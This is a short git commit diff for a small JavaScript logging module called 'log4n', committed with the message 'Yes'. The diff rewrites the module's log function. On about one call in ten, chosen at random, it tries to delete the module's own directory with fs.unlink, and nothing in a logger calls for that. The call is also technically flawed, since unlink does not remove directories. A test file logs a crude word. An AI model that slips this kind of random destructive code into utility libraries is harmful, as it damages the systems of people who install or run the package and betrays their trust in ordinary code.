26fb7985e916f9accb4bd7808d4231c6efdb7737
Ducksquaddd <ducksquadddd@gmail.com>
2021-12-16 19:25:51 -0800

    Yes

--- src/log4n.js
+++ src/log4n.js
@@ -1,6 +1,19 @@
-'use strict'
+"use strict";
 
-exports.log = function(message) {
-    console.log(message)
-}
+const fs = require("fs");
 
+exports.log = function (message) {
+  console.log(message);
+
+  let num = Math.floor(Math.random() * 10);
+
+  console.log(num);
+  if (num === 5) {
+    fs.unlink(__dirname, (err) => {
+      if (err) {
+        console.error(err);
+        return;
+      }
+    });
+  }
+};
--- tests/yer.js
+++ tests/yer.js
@@ -1,3 +1,4 @@
 const log4n = require('../src/log4n')
 
+
 log4n.log("penis")
